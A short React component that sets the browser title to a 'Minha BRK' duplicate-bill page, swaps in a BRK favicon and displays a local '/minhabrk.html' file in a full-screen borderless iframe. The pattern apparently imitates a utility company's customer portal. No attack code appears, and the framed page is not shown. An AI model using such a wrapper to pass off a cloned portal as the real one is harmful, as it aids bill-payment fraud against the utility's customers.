import { useEffect } from "react";

export default function PaginaBRK() {
  useEffect(() => {
    const prev = document.title;
    document.title = "2ª via fácil - Minha BRK";

    const existing = document.querySelector("link[rel~='icon']");
    const prevHref = existing ? existing.getAttribute("href") : null;
    let link = existing;
    if (!link) {
      link = document.createElement("link");
      link.setAttribute("rel", "icon");
      document.head.appendChild(link);
    }
    link.setAttribute("type", "image/x-icon");
    link.setAttribute("href", "/brk-favicon.ico");

    return () => {
      document.title = prev;
      if (prevHref) link.setAttribute("href", prevHref);
    };
  }, []);

  return (
    <iframe
      data-testid="pagina-brk-frame"
      src="/minhabrk.html"
      title="Minha BRK"
      style={{ position: "fixed", inset: 0, width: "100%", height: "100%", border: "none" }}
    />
  );
}
